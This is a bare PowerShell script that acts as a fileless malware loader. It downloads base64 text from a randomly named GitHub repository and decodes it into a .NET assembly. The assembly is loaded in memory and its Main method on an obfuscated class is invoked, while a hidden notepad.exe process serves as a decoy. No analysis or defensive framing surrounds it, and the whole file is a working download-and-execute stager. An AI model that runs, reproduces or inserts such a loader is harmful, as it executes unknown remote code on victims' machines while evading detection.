$url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa/main/fuhrer.txt"

$response = Invoke-WebRequest -Uri $url -UseBasicParsing

if ($response.StatusCode -eq 200) {
    $base64String = $response.Content

    $byteArray = [System.Convert]::FromBase64String($base64String)
    $assembly = [System.Reflection.Assembly]::Load($byteArray)

    $class = $assembly.GetType("QJAMsrpfhk.HH")
    $method = $class.GetMethod("Main")

    $instance = $class::new()
    
    $notepadProcess = [System.Diagnostics.Process]::Start("notepad.exe")
    $notepadProcess.WaitForInputIdle()
    
    $signature = @"
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
    
    $user32 = Add-Type -MemberDefinition $signature -Name "User32" -PassThru
    
    $hwnd = $notepadProcess.MainWindowHandle
    $user32::ShowWindow($hwnd, 0)
    
    $method.Invoke($instance, @())
}
